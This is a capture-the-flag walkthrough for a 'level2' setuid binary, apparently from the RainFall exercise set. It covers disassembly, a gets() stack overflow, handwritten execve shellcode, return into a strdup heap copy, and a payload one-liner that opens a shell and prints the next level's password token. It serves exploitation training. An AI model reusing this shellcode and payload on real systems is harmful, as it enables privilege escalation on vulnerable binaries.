# level2 walkthrough
Given 32 bit setuid binary. Lets disassemble it with gdb:

    (gdb) disass main
    Dump of assembler code for function main:
    0x0804853f <+0>:	push   ebp
    0x08048540 <+1>:	mov    ebp,esp
    0x08048542 <+3>:	and    esp,0xfffffff0
    0x08048545 <+6>:	call   0x80484d4 <p>
    0x0804854a <+11>:	leave
    0x0804854b <+12>:	ret
    End of assembler dump.

Main function just calls "p" function without any arguments.

    (gdb) disass p
    Dump of assembler code for function p:
    0x080484d4 <+0>:	push   ebp
    0x080484d5 <+1>:	mov    ebp,esp
    0x080484d7 <+3>:	sub    esp,0x68
    0x080484da <+6>:	mov    eax,ds:0x8049860
    0x080484df <+11>:	mov    DWORD PTR [esp],eax
    0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
    0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
    0x080484ea <+22>:	mov    DWORD PTR [esp],eax
    0x080484ed <+25>:	call   0x80483c0 <gets@plt>
    0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
    0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
    0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
    0x080484fb <+39>:	and    eax,0xb0000000
    0x08048500 <+44>:	cmp    eax,0xb0000000
    0x08048505 <+49>:	jne    0x8048527 <p+83>
    0x08048507 <+51>:	mov    eax,0x8048620
    0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
    0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
    0x08048513 <+63>:	mov    DWORD PTR [esp],eax
    0x08048516 <+66>:	call   0x80483a0 <printf@plt>
    0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
    0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
    0x08048527 <+83>:	lea    eax,[ebp-0x4c]
    0x0804852a <+86>:	mov    DWORD PTR [esp],eax
    0x0804852d <+89>:	call   0x80483f0 <puts@plt>
    0x08048532 <+94>:	lea    eax,[ebp-0x4c]
    0x08048535 <+97>:	mov    DWORD PTR [esp],eax
    0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
    0x0804853d <+105>:	leave
    0x0804853e <+106>:	ret
    End of assembler dump.

There is a gets call in "p" function which reads into buffer allocated on stack, so this binary should be vulnerable to stack overflow atack just like binary from previous level.
But there are two problems. Firstly there is no function containing vulnerability itself, we would need to create it by ourself and insert it in buffer via gets.
Secondly there is a jump condition (p+49) which leads to a branch with exit call if highest bit of saved return address equals 0xb.
If we get into this branch process will die and we wouldn't be able to execute any harmful code.
That's why we can't set return address to the buffer, but in other branch there is strdup call which allocates memory in heap and copies our buffer in allocated string.
We can set our return code to the allocated string address and execute our code from there.

## Buffer exploit
Our main goal is to launch shell from setuid binary, but we can't use library function calls because there are no execve functions linked to this binary.
That's why we need to write execve from scratch on assembler using syscall:

    mov eax 0x0000000b  ; syscall number 
    mov ebx, 0x80c5188  ; string address
    mov ecx, 0x00000000 ; command arguments
    mov edx, 0x00000000 ; environment variables
    int 0x80            ; software interrupt

Normal execve syscal of /bin/sh would look like this, but there are two restrictions for our case: we can't have 0x0 byte in our code, because strdup accepts null terminated string and we also can't have \n byte, because gets would stop reading our string.
Keeping those constraints lets rewrite asm code:

    push   0xb          ; Push syscall number on stack
    pop    eax          ; Pop syscall number from stack in eax register
    cdq                 ; Clear edx register and high values of eax
    push   edx          ; Push zeroed registers on stack (to have null-terminated string)
    push   0x68732f2f   ; Push "/sh" part of string converted to DWORD PTR little endian value
    push   0x6e69622f   ; Push "/bin" part of string converted to DWORD PTR little endian value
    mov    ebx,esp      ; Copy top of stack address in ebx (binary path to launch)
    xor    ecx,ecx      ; Zero ecx with xor (no env variables provided)
    int    0x80         ; Call software interrupt

Now we can use gdb or online service to convert asm into binary code for our exploit:

    \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

## Overwrite return address
Return code offset from buffer could be easily calculated since there is no alighment performed at the prelude of the function.
Knowing that buffer buffer starts at the ebp-0x4c, ebp is 4 bytes and return address placed right above ebp we can simply add those values (0x4c+4=0x50) and get offset from the beginning of our buffer which is 80 bytes.
Our exploit string is 21 bytes long, so we need 80-21=59 random bytes prefix and new return address in little endian.
As mentioned above we need to overwrite return address with allocated string from strdup.
It would be contained in eax register after strdup function call which we can lookup using gdb:

    (gdb) b *p+105
    Breakpoint 1 at 0x804853d
    (gdb) run
    Starting program: /home/user/level2/level2
    something
    something

    Breakpoint 1, 0x0804853d in p ()
    (gdb) info registers eax
    eax            0x804a008	134520840

Here it is, our new return address should be set to 0x804a008.

## Performing exploit
Putting all parts together lets execute our exploit:

    level2@RainFall:~$ python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a"*59 + "\x08\xa0\x04\x08")' > /tmp/level2/shellcode
    level2@RainFall:~$ cat /tmp/level2/shellcode - | ./level2
    j
    X�Rh//shh/bin��1�̀aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�
    whoami
    level3
    cat /home/user/level3/.pass
    492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02

Here is our token for the next level.